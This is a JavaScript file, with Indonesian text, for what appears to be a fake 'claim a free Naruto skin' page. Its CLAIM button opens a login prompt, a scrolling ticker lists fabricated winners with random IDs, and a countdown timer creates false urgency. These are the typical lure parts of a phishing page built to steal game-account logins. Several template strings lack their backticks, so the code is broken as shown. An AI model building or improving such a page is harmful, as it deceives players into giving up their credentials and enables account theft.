const skins = [ { name: "Naruto Uzumaki", img: "https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg" }, { name: "Sakura Haruno", img: "https://i.ibb.co/Hfj4SsgH/IMG-20250513-192111.jpg" }, { name: "Sasuke Uchiha", img: "https://i.ibb.co/tPPz7GPS/IMG-20250513-192141.jpg" }, { name: "Kakashi Hatake", img: "https://i.ibb.co/wfk0j8T/IMG-20250513-192211.jpg" } ];

function showSkins() { document.getElementById("introScreen").classList.remove("show"); document.getElementById("skinSelectScreen").classList.add("show"); const grid = document.getElementById("skinGrid"); grid.innerHTML = ""; skins.forEach(skin => { const card = document.createElement("div"); card.className = "skin-card"; card.innerHTML = <img src="${skin.img}" alt="${skin.name}"> <div class="skin-name">${skin.name}</div> <button class="claim-btn" onclick="claimSkin('${skin.name}')">CLAIM</button>; grid.appendChild(card); }); }

function claimSkin(name) { alert(Kamu memilih skin ${name}. Silakan login untuk melanjutkan.); document.getElementById("loginModal").classList.add("show"); }

function generateMarquee() { const nicks = ["RzLgn", "DarkWolf", "Sakura99"]; let text = ""; for (let i = 0; i < 15; i++) { const nick = nicks[Math.floor(Math.random() * nicks.length)]; const id = Math.floor(100000000 + Math.random() * 900000000); const skin = skins[Math.floor(Math.random() * skins.length)].name; text += ${nick} (ID:${id}) dapat ${skin} • ; } document.getElementById("marqueeText").textContent = text; }

let countdownTime = 24 * 60 * 60; const countdownElement = document.getElementById("countdownTimer"); function updateCountdown() { const h = String(Math.floor(countdownTime / 3600)).padStart(2, '0'); const m = String(Math.floor((countdownTime % 3600) / 60)).padStart(2, '0'); const s = String(countdownTime % 60).padStart(2, '0'); countdownElement.textContent = ${h}:${m}:${s}; if (countdownTime > 0) countdownTime--; } setInterval(updateCountdown, 1000);

window.onload = () => { generateMarquee(); };
